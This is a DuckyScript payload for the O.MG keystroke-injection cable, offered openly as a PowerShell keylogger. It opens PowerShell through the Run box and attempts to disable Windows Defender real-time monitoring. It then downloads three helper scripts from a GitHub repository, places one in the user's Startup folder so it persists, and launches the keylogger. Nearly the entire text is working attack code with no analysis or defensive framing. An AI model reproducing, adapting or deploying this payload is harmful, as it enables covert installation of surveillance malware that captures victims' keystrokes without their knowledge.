REM Powershell Keylogger for the O.MG
REM created by : Marshmadnesss/C0SM0

REM STAGE1
REM open runbox
DELAY 1000
GUI r
DELAY 200
STRING powershell
ENTER
DELAY 300

REM STAGE2
REM attempts to disable defender
STRING Set-MpPreference -DisableRealtimeMonitoring $true;
ENTER

REM STAGE3
REM will download needed files (c.cmd, l.ps1, .p.ps1) to directory
DELAY 1000
GUI r
DELAY 200
STRING powershell
ENTER
DELAY 300
STRING $Script = Invoke-WebRequest https://raw.githubusercontent.com/marshmadnesss/keyfinder/main/c.cmd -OutFile .\c.cmd
ENTER
STRING $Script = Invoke-WebRequest https://github.com/marshmadnesss/keyfinder/blob/main/l.ps1 -OutFile .\l.ps1
ENTER
STRING
$Script = Invoke-WebRequest https://github.com/marshmadnesss/keyfinder/blob/main/p.ps1 -OutFile .\p.ps1


REM STAGE 3
REM move files to appropiate directories
REM change 'C' to the name of saved directory of files
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'C'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\l.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
ENTER
DELAY 200

REM comment out the option you decide NOT to use

REM STAGE 4 
REM run keylogger
STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";.\c.cmd;exit

REM STAGE 5
REM deploy
ENTER
